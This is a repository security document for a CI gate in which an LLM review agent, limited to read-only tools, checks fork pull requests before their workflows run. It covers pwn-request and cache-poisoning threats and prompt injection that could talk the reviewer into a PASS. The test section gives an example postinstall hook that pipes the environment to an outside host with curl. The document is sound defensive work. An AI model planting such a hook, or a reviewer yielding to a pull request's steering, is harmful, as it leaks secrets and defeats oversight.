# CI security: pull requests from forks and the automated review

This repository is public, so anyone can open a pull request from a fork. No
workflow runs on such a pull request until the automated security review has
passed for the pull request's current commit. GitHub's approval for outside
contributors holds the runs. The review workflow is what approves them.

## What runs, and when

| Pull request from | `ci`, `pr-guard` | `llm-security-review` (`pull_request_target`) |
|---|---|---|
| a branch of this repository (maintainers) | at once | at once |
| Dependabot (a branch of this repository) | at once, with a read-only token and Dependabot's secrets only | at once, reviewed like any other pull request |
| a fork | held (`action_required`) until they are approved: by the review, on PASS, for that commit; or by a maintainer | at once |

Pull requests from forks are held because of the repository setting **Require
approval for all external contributors** (Settings → Actions → General). A
`pull_request_target` workflow always runs, whatever that setting says,
because it is the default branch's own workflow and not the pull request's.
That is why the review is one.

CodeQL is not in that table: it is a scheduled workflow on main
(`.github/workflows/codeql.yml`, once a day) and runs on neither a pull request
nor a push. A pull request therefore never waits on it, and approving a fork's
runs approves only `ci` and `pr-guard`. It scans the code that ships, not the
tests (`.github/codeql/codeql-config.yml`).

## The gate, step by step

1. A fork's pull request is opened, reopened, marked ready, or pushed to. Its
   head is now commit C. GitHub creates C's runs of `ci` and `pr-guard` and
   holds them. `llm-security-review` starts at once, from main.
2. **`llm-security-review`** (the required check) checks C out by its sha as
   data, without credentials. It writes the diff `base...C` and the list of
   changed files next to the checkout, and has the review agent read them. A
   BLOCK verdict, no verdict, or a session with more than read-only tools fails
   the check.
3. **`comment`** posts the verdict and the findings on the pull request as one
   comment. Later runs update the same comment.
4. **`approve-fork-runs`** runs on PASS only, and only if the pull request
   changes nothing under `.github/`. It lists the runs with `head_sha` = C that
   wait for approval, keeps those whose head repository is the pull request's
   (compared by id), and approves each one
   (`POST /repos/{owner}/{repo}/actions/runs/{id}/approve`,
   [`.github/scripts/approve-fork-runs.sh`](../.github/scripts/approve-fork-runs.sh)).
   C's runs now start.
5. On BLOCK or an error nothing is approved. The comment says why, and C's runs
   keep waiting for a maintainer (see [When the review blocks or fails](#when-the-review-blocks-or-fails)).
   The same goes for a pull request that changes anything under `.github/`,
   whatever the verdict. Those files decide which jobs CI runs, under which
   names and with which triggers, so a person approves them.
6. A push makes a new commit C2. C2's runs are held in the same way and get
   their own review. A review of C that is still going is cancelled, so it
   approves nothing (`concurrency`). Approving C's runs never approves C2's.

Drafts are not reviewed. Their runs wait until the pull request is marked
ready. The repository variable `LLM_REVIEW_ENABLED` switches the review on
(`true`). When it is off, every job of the workflow is skipped, and a fork's
runs wait for a maintainer.

## Threat analysis

### `pull_request_target` (the "pwn request")

A `pull_request_target` run has this repository's secrets and a token that can
write, and its cache scope is the default branch's. Anything the pull request
controls that runs in it, or that it reads as configuration, gets all of that.
This is how each way in is closed:

- **The workflow itself.** Its definition is always the default branch's. A
  pull request that changes `llm-security-review.yml` changes nothing about the
  run that reviews it.
- **Running the pull request's code.** Nothing of it runs: there is no
  install, no build and no script of it. Its commit is checked out by sha
  without persisted credentials (`persist-credentials: false`), with no
  submodules and no LFS. The diff is made with `--no-ext-diff --no-textconv`.
  The approve job checks out main's script only.
- **Configuration the agent would load.** claude-code-action works in the
  checkout. Claude Code reads `.claude/` (settings with hooks, which are
  commands), `.mcp.json` (MCP servers, which are commands) and `CLAUDE.md` from
  the directory it works in, and its built-in plugins read `AGENTS.md`. Before
  the agent starts, every `.claude`, `.claude.json`, `.mcp.json`, `CLAUDE.md`,
  `CLAUDE.local.md`, `AGENTS.md` and `.ripgreprc` at any depth is renamed with a
  `.pr-data` suffix. The action also restores the
  top-level ones from main. The session loads user settings only
  (`--setting-sources user`) and no MCP configuration
  (`--strict-mcp-config`). The action runs its own code with `bun --no-env-file`
  and its own `bunfig.toml`.
- **Links.** Each symbolic link in the checkout is replaced by a text file that
  names its target. A link cannot lead a read outside the checkout.
- **Expression injection.** Nothing the pull request controls (title, body,
  branch name) is written into a script with `${{ }}`. Scripts get the
  pull request's number, shas and repository id only, through environment
  variables.
- **Tokens.** The workflow grants nothing by default (`permissions: {}`).
  Each job asks for its own:
  - `llm-security-review`: `contents: read`. The agent runs in this job.
  - `comment`: `pull-requests: write`.
  - `approve-fork-runs`: `actions: write`, `contents: read`.

  The two jobs that can write never check out the pull request and run nothing
  from it.
- **Secrets.** Only one step reads the gateway's secrets. It starts a local
  proxy, gives it the key through a pipe, and starts it with an empty
  environment. The proxy forwards the agent's API calls to the gateway and puts
  the key in them. No process of the review step has the key in its
  environment, so the agent cannot find it anywhere it can read.
- **Cache poisoning.** A `pull_request_target` run reads and writes the default
  branch's cache scope. No job here restores or saves a cache.
  claude-code-action's `setup-bun` runs with caching off. The agent has no tool
  that reaches the cache service. The runner gives the cache token only to
  JavaScript and container actions, not to the `run:` step that the agent's
  session runs in. Checked: `ACTIONS_RUNTIME_TOKEN`, `ACTIONS_RUNTIME_URL`,
  `ACTIONS_CACHE_URL` and `ACTIONS_RESULTS_URL` are unset both in a run step
  and in a composite action's run step (claude-code-action is one). The
  review step also sets them empty, in case that changes.
- **Artifacts.** The transcript is uploaded only when the repository is
  private (it can name the gateway's host).

### Prompt injection

The pull request is the agent's input. Assume that it can make the agent do
anything its tools allow, and say anything in its output.

- **What it can do: read files, nothing else.** The session's tool set is Read,
  Grep and Glob (`--tools`). They are the only allowed tools (`--allowedTools`).
  Bash, Edit, MultiEdit, Write, NotebookEdit, WebFetch, WebSearch, Task, Agent
  and Skill are denied, and so are reads under `/proc`, `/sys`, `/dev` and the
  runner's temporary directory (`--disallowedTools`). It has no MCP server:
  claude-code-action adds its GitHub servers only for tools named in
  `--allowedTools`. There is no shell, no network and no write.
- **The read denials hold for Grep and Glob too.** This was checked with a
  planted file: the same canary file, once in the runner's temporary
  directory (denied) and once in a directory beside it (allowed).
  - Every Read, Grep and Glob aimed at a denied path was refused ("Permission
    to read … has been denied"), whether the path was written directly, through
    `..`, or as a Glob's absolute pattern. The paths tried were
    `/proc/self/environ`, `/proc/self`, `/proc`, `/sys`, `/dev` and the
    temporary directory.
  - A Grep or a Glob from a parent directory (`/home/runner/work`,
    `/home/runner`) found the allowed copy only. The denied subtree is left out
    of the search.
- **Checked on every run:** the first message of each
  attempt's transcript lists the session's tools and MCP servers. If it lists
  anything other than Read, Grep, Glob and StructuredOutput, or any MCP server,
  or if there is no transcript, there is no verdict and the check fails.
- **What it can read.** It can read the checkout, the diff, and other files the
  runner's user can read. The gateway's key is not in any of them (above). The
  job's token is in its environment, but that token can only read a public
  repository, and it expires when the job ends, before the `comment` job posts
  anything.
- **What it can say.** Its structured output (a JSON schema: PASS or BLOCK,
  summary, findings) is the only thing that leaves the job. The `comment` job
  posts it as plain text:
  - Markdown and HTML images and links are removed, and a link keeps only its
    text;
  - every other HTML tag is removed, and a leftover `<` is escaped;
  - URLs are defanged (`https[:]//`, `www[.]`), so nothing in it is clickable;
  - @-mentions are defused;
  - its length is capped. If any part looks
  like a credential (a GitHub token, an `sk-` key, a JWT, a private key),
  nothing of it is posted and the job fails. If the agent returns anything
  other than PASS or BLOCK, that counts as no verdict, and the check fails.
- **What it can decide.** A convincing pull request might talk the model into a
  PASS. Reopening it, or pushing again, gets another try. Either way, the most
  it gains is that its own commit's runs start (see the next section). The
  review is not an approval to merge: a maintainer still reads and merges every
  pull request. The prompt treats an attempt to steer the reviewer as a HIGH
  finding, which means BLOCK. The gateway meters and caps the key, and only one
  review per pull request runs at a time.

### Time of check and time of use

- **The review reads what the event names.** It reviews commit C, the event's
  `pull_request.head.sha`, checked out by sha. A branch name could move under
  it; a sha cannot. The diff is `base...C`.
- **The approval matches only what was reviewed.** `approve-fork-runs`
  approves a run only if three things hold: its `head_sha` is C, its head
  repository has the id of the pull request's, and it waits for approval.
  A push after the review creates runs for another commit, C2, which this
  review never approves. They wait for C2's review. If C's review is still
  going when C2 arrives, it is cancelled.
  [`.github/scripts/approve-fork-runs.test.sh`](../.github/scripts/approve-fork-runs.test.sh)
  checks this against mocked API responses.
- **Runs created for C after the approval** wait for a maintainer. A title edit,
  for example, starts `pr-guard` again (`edited`), and the review does not run
  on `edited`. A force-push back to C counts as a push: it gets a new review.
- **The same commit in another pull request** from the same fork is the same
  content. Its runs are approved too. Their base is a branch of this
  repository, which is trusted.

### What an approved run from a fork can still do

An approved run runs the pull request's code and its own copy of the
`pull_request` workflows on a GitHub-hosted runner, as any fork's run does:

- It gets no secrets (neither Actions nor Dependabot ones), a read-only
  `GITHUB_TOKEN`, and no OIDC token.
- It can read the default branch's caches. It can write caches only in its own
  scope (`refs/pull/<n>/merge`), which main, the release and other pull
  requests never read. It cannot poison their caches.
- It can use the runner's compute and network until the job's timeout. It can
  upload artifacts to its own run. It can report checks on its own commit.
  With a changed workflow, those could include a new job named like a required
  check, which reports a pass in place of the real one. That is why a change
  under `.github/` is never approved automatically. The review also blocks such
  a job, and a maintainer who approves those runs by hand reads the workflow
  changes first.
- It cannot push, comment, label, approve, or touch a release. `release.yml`
  runs on tags only, and its secrets are in the protected `release`
  environment.

### Why not `workflow_run`

The other common design is to leave the pull request's own runs alone and run
CI from a `workflow_run` workflow after the review. It is not used here:

- **Cache poisoning.** A `workflow_run` run works in the default branch's
  context. It has main's cache scope, secrets, and a token that can write.
  Building or testing the pull request's code there would let that code write
  caches that main and the release then restore, and reach those secrets.
- **Checks on the wrong commit.** A `workflow_run` run's checks are on the
  default branch's latest commit, not on the pull request's. They do not show
  on the pull request, and they do not satisfy the ruleset's required checks.
  Commit statuses would have to be written by hand.

Holding the pull request's own `pull_request` runs keeps all of that as it is
for every other pull request: they are read-only, have no secrets, use a cache
scoped to the pull request, and put their checks on its commit.

## Checks and settings this relies on

- Settings → Actions → General: **Require approval for all external
  contributors** (API: `fork-pr-contributor-approval` is
  `all_external_contributors`). With a weaker choice (first-time contributors
  only), a contributor with one merged pull request runs CI on every later one
  without the review.
- Settings → Actions → General → Workflow permissions: read (the default for
  the token).
- The ruleset for main requires `llm-security-review` from GitHub Actions. That
  is the review job's check run. A `pull_request_target` run's check runs are on
  the pull request's head commit, so no commit status is written.
- The variable `LLM_REVIEW_ENABLED` must be `true`. The secrets
  `OPENROUTER_BASE_URL` and `OPENROUTER_API_KEY` must be set, and the variable
  `LLM_REVIEW_MODEL` is optional.
- Optional: the secret `FORK_RUN_APPROVER_TOKEN`. When it is set,
  `approve-fork-runs` approves with it instead of the job's `GITHUB_TOKEN`. Use a
  fine-grained personal access token with these limits:
  - resource owner `getdroppen`, repository `droppen` only;
  - repository permissions *Actions: Read and write* (and the *Metadata: Read*
    that GitHub adds), nothing else;
  - a short expiry.

  The job's own token, with `actions: write`, is allowed to call the endpoint:
  for a finished run it gets "not waiting for approval", where a token without
  that permission gets "Resource not accessible by integration". So the secret
  is only needed if GitHub ever refuses that token's approvals.

## When the review blocks or fails

- Read the comment and the run. A BLOCK names its findings. With no verdict,
  the run says why (the gateway, the model, a transcript that could not be
  checked).
- To run the review again: open the pull request's `llm-security-review` run
  and choose **Re-run all jobs**. A PASS approves the waiting runs.
- To run CI anyway: in the pull request, choose **Approve workflows to run**.
  First read what the pull request changes under `.github/`, in `scripts/`, in
  the package scripts and in `build.rs`. Those run in its CI.
- Before you approve a fork's runs by hand, check its workflow changes for a
  job named after a required check: `llm-security-review`, `web`,
  `web-tests (1)` to `(3)`, `web-reproducible`, `server`, `secrets-scan`,
  `DCO` or `no-skip-markers`. Look at both the job's id and its `name:`. Such a
  job reports a pass in the real check's place, and the ruleset cannot tell
  the two apart, because both come from GitHub Actions. Do not approve a pull
  request that has one.

## Testing the gate end to end

This needs a second GitHub account that is not a member of the organisation,
for example a throwaway account.

1. With that account, fork `getdroppen/droppen`, and in the fork change one line
   of a document (for example a typo in `docs/ui-spec.md`). Commit it with
   `git commit -s`, then open a pull request against `getdroppen/droppen:main`.
2. On the pull request, under Checks, check that:
   - `llm-security-review` is running;
   - `ci` and `pr-guard` show as waiting for approval.

   The API agrees:

   ```sh
   gh api "repos/getdroppen/droppen/actions/runs?head_sha=<head sha>" \
     --jq '.workflow_runs[] | [.name, .event, .status, .conclusion] | @tsv'
   ```

   The review run is `pull_request_target`, `in_progress`. Every other run is
   `completed`, `action_required`.
3. When the review passes, check four things:
   - the comment appears;
   - `approve-fork-runs` logs `approved run <id>` for each waiting run;
   - those runs start;
   - the check `llm-security-review` appears on the pull request's commit and
     satisfies the ruleset.
4. Push a second harmless commit to the fork. The new commit's runs wait again,
   and its own review approves them. The first commit's review approved
   nothing of the second's.
5. Push a commit that should block, for example a `postinstall` script in
   `package.json` that runs `curl https://example.com/$(env | base64)`. Check
   three things:
   - the review says BLOCK in its comment;
   - `approve-fork-runs` is skipped;
   - the runs stay `action_required`.
6. Revert that, and push a harmless change under `.github/`, for example a
   comment in `.github/workflows/pr-guard.yml`. The review may pass, but the
   comment says that a maintainer approves, `approve-fork-runs` is skipped, and
   the runs stay `action_required`.
7. If step 3 shows `could not approve run` (GitHub refused the job's token),
   set `FORK_RUN_APPROVER_TOKEN` (above) and re-run the review.
8. Close the pull request, and delete the fork and the account.
